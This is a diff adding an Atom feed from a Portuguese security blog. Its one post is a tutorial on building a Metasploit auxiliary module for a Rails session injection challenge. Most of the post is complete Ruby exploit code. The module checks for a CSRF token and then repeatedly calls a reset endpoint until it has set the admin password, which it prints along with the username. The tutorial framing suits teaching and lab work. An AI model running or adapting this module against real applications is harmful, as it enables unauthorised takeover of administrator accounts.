@@ -1,0 +1,265 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: Metasploit | P0cL4bs Team]]></title>
+  <link href="http://p0cl4bs.github.io/blog/categories/metasploit/atom.xml" rel="self"/>
+  <link href="http://p0cl4bs.github.io/"/>
+  <updated>2015-03-31T16:06:29-03:00</updated>
+  <id>http://p0cl4bs.github.io/</id>
+  <author>
+    <name><![CDATA[P0cL4bs]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[Rails Session Injection Challenge: Criando Um Módulo Para O Metasploit]]></title>
+    <link href="http://p0cl4bs.github.io/blog/2015/03/31/rails-session-injection-challenge-criando-um-modulo-para-o-metasploit/"/>
+    <updated>2015-03-31T15:49:07-03:00</updated>
+    <id>http://p0cl4bs.github.io/blog/2015/03/31/rails-session-injection-challenge-criando-um-modulo-para-o-metasploit</id>
+    <content type="html"><![CDATA[<pre><code>MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMM                MMMMMMMMMM
+MMMN$                           vMMMM
+MMMNl  MMMMM             MMMMM  JMMMM
+MMMNl  MMMMMMMN       NMMMMMMM  JMMMM
+MMMNl  MMMMMMMMMNmmmNMMMMMMMMM  JMMMM
+MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
+MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
+MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
+MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
+MMMNI  MMMNM   MMMMMMM   MMMMM  jMMMM
+MMMNI  WMMMM   MMMMMMM   MMMM#  JMMMM
+MMMMR  ?MMNM             MMMMM .dMMMM
+MMMMNm `?MMM             MMMM` dMMMMM
+MMMMMMN  ?MM             MM?  NMMMMMN
+MMMMMMMMNe                 JMMMMMNMMM
+MMMMMMMMMMNm,            eMMMMMNMMNMM
+MMMMNNMNMMMMMNx        MMMMMMNMMNMMNM
+MMMMMMMMNMMNMMMMm+..+MMNMMNMNMMNMMNMM
+        http://metasploit.pro
+</code></pre>
+
+<p>Recentemente o <a href="https://twitter.com/akitaonrails">@akitaonrails</a> fez um <a href="http://www.akitaonrails.com/2014/08/27/small-bite-brincando-com-metasploit">post</a> sobre um <a href="https://twitter.com/joernchen/status/504304803045208064"> desafio básico de segurança</a> do <a href="https://twitter.com/joernchen">@joernchen</a>.</p>
+
+<p>O desafio é realmente básico, mas aproveitei a oportunidade para mostrar como desenvolver um módulo para o Metasploit.</p>
+
+<p>Vamos criar um módulo auxiliar, para isso crie o arquivo <code>metasploit-framework/modules/auxiliary/admin/http/rails_csrf_token_bypass.rb</code> contendo:</p>
+
+<pre><code class="Ruby">require 'msf/core'
+require 'mechanize'
+
+class Metasploit3 &lt; Msf::Auxiliary
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize
+  end
+
+  def check
+  end
+
+  def run
+  end
+end
+</code></pre>
+
+<p>Importamos primeiramente o core do Metasploit(<code>require 'msf/core'</code>) e a gem <a href="https://rubygems.org/gems/mechanize">mechanize</a>(<code>require 'mechanize'</code>), incluimos também o <code>Msf::Exploit::Remote::HttpClient</code> que nos traz algumas coisas úteis como validação de parâmetros e muito mais, após criamos 3 métodos:</p>
+
+<ul>
+<li>initialize : Adicionamos informações do módulo que será usado pelo Metasploit.</li>
+<li>check : Faremos a validação se o host está vulneravel.</li>
+<li>run : Código que explorará a falha.</li>
+</ul>
+
+
+<h2>initialize</h2>
+
+<p>Nesse método adicionamos informações como nome, descrição, autor e licença no <code>super()</code>, e adicionamos algumas opções para usarmos no exploit com <code>register_options</code>.</p>
+
+<pre><code class="Ruby">#include......
+
+def initialize
+  super(
+    'Name'           =&gt; 'Rails CSRF Bypass',
+    'Version'        =&gt; '$Revision: 1 $',
+    'Description'    =&gt; 'Session Injection Exploit for Rails App',
+    'Author'        =&gt;
+    [
+      'akitaonrails', #original discovery and disclosure
+      'joridos' #metasploit module
+    ],
+    'License'        =&gt; MSF_LICENSE
+  )
+  register_options(
+    [
+      OptString.new('TARGETURI', [ true,  'The request URI', '/reset/_csrf_token']),
+      OptString.new('PASSWORD', [true, 'The password to set']),
+    ], self.class)
+end
+
+#def check.....
+</code></pre>
+
+<h2>check</h2>
+
+<p>Aqui nós verificamos se o alvo está online e vulnerável, então exibimos <code>Exploit::CheckCode::Detected[0]</code> e retornamos <code>Exploit::CheckCode::Vulnerable</code>, se não estiver vulnerável retornamos <code>return Exploit::CheckCode::Safe</code>.</p>
+
+<pre><code class="Ruby">def check
+  agent = Mechanize.new { |agent|
+    agent.user_agent_alias = 'Mac Safari'
+  }
+  if page = agent.get("http://#{datastore['RHOST']}/")
+    print_status Exploit::CheckCode::Detected[0]
+  else
+    print_error "Host not found"
+    return Exploit::CheckCode::Unsupported
+  end
+  if page.at('meta[@name="csrf-token"]')[:content]
+    print_status('Found csrf-token, exploitable')
+    return Exploit::CheckCode::Vulnerable
+  else
+    return Exploit::CheckCode::Safe
+  end
+end
+</code></pre>
+
+<p>Tipos de retorno disponível:</p>
+
+<pre><code class="Ruby">CheckCode::Safe # não explorável
+CheckCode::Detected # serviço detectado
+CheckCode::Appears # versão vulnerável
+CheckCode::Vulnerable # confirmado a vulnerabilidade
+CheckCode::Unsupported # não suportado para este módulo.
+</code></pre>
+
+<h2>run</h2>
+
+<p>Nesse método temos o código do exploit feito pelo <a href="https://twitter.com/akitaonrails">@akitaonrails</a>, modificado um pouco para o módulo.</p>
+
+<pre><code class="Ruby">def run
+  $hacked = false
+  if datastore['PASSWORD'].length &lt; 7
+    print_error("use password from 7 characters and no special characters")
+    return Exploit::CheckCode::Unsupported
+  end
+  begin
+    agent = Mechanize.new { |agent|
+      agent.user_agent_alias = 'Mac Safari'
+    }
+    page = agent.get("http://#{datastore['RHOST']}/")
+    token = page.at('meta[@name="csrf-token"]')[:content]
+    print_status "#{token}"
+    if token =~ /^1\w+/
+      doc = agent.get("http://#{datastore['RHOST']}#{datastore['TARGETURI']}?password=#{datastore['PASSWORD']}")
+      $hacked = doc.content
+      print_good doc.content
+    end
+  end  while $hacked != "password changed ;)"
+    print_good "user: admin"
+    print_good "pass: #{datastore['PASSWORD']}"
+end
+</code></pre>
+
+<p>Nosso exploit completo fica:</p>
+
+<pre><code class="Ruby">require 'msf/core'
+require 'mechanize'
+
+class Metasploit3 &lt; Msf::Auxiliary
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize
+    super(
+      'Name'           =&gt; 'Rails CSRF Bypass',
+      'Version'        =&gt; '$Revision: 1 $',
+      'Description'    =&gt; 'Session Injection Exploit for Rails App',
+      'Author'        =&gt;
+      [
+        'akitaonrails', #original discovery and disclosure
+        'joridos' #metasploit module
+      ],
+      'License'        =&gt; MSF_LICENSE
+    )
+    register_options(
+      [
+        OptString.new('TARGETURI', [ true,  'The request URI', '/reset/_csrf_token']),
+        OptString.new('PASSWORD', [true, 'The password to set']),
+      ], self.class)
+  end
+
+  def check
+    agent = Mechanize.new { |agent|
+      agent.user_agent_alias = 'Mac Safari'
+    }
+    if page = agent.get("http://#{datastore['RHOST']}/")
+      print_status Exploit::CheckCode::Detected[0]
+    else
+      print_error "Host not found"
+      return Exploit::CheckCode::Unsupported
+    end
+    if page.at('meta[@name="csrf-token"]')[:content]
+      print_status('Found csrf-token, exploitable')
+      return Exploit::CheckCode::Vulnerable
+    else
+      return Exploit::CheckCode::Safe
+    end
+  end
+
+  def run
+    $hacked = false
+    if datastore['PASSWORD'].length &lt; 7
+      print_error("use password from 7 characters and no special characters")
+      return Exploit::CheckCode::Unsupported
+    end
+    begin
+      agent = Mechanize.new { |agent|
+        agent.user_agent_alias = 'Mac Safari'
+      }
+      page = agent.get("http://#{datastore['RHOST']}/")
+      token = page.at('meta[@name="csrf-token"]')[:content]
+      print_status "#{token}"
+      if token =~ /^1\w+/
+        doc = agent.get("http://#{datastore['RHOST']}#{datastore['TARGETURI']}?password=#{datastore['PASSWORD']}")
+        $hacked = doc.content
+        print_good doc.content
+      end
+    end  while $hacked != "password changed ;)"
+      print_good "user: admin"
+      print_good "pass: #{datastore['PASSWORD']}"
+  end
+end
+</code></pre>
+
+<p>Adicione o <code>mechanize</code> no Gemfile do metasploit:</p>
+
+<pre><code class="Ruby">group :development, :test do
+  # Other gems.........
+  # Mechanize for exploit rails_csrf_token_bypass
+  gem 'mechanize'
+end
+</code></pre>
+
+<p>Agora basta executar:</p>
+
+<pre><code class="sh">$ bundle install
+</code></pre>
+
+<p><a href="https://github.com/joridos/Rails-session-injection-challenge">GitHub source code</a></p>
+
+<p>E usar:</p>
+
+<h1><img src="/images/rails_csrf01.png" alt="Metasploit" /></h1>
+
+<h1><img src="/images/rails_csrf02.png" alt="Metasploit" /></h1>
+
+<h1><img src="/images/rails_csrf03.png" alt="Metasploit" /></h1>
+
+<h1><img src="/images/rails_csrf04.png" alt="Metasploit" /></h1>
+
+<h1><img src="/images/rails_csrf05.png" alt="Metasploit" /></h1>
+
+<h1><img src="/images/rails_csrf06.png" alt="Metasploit" /></h1>
+]]></content>
+  </entry>
+  
+</feed>
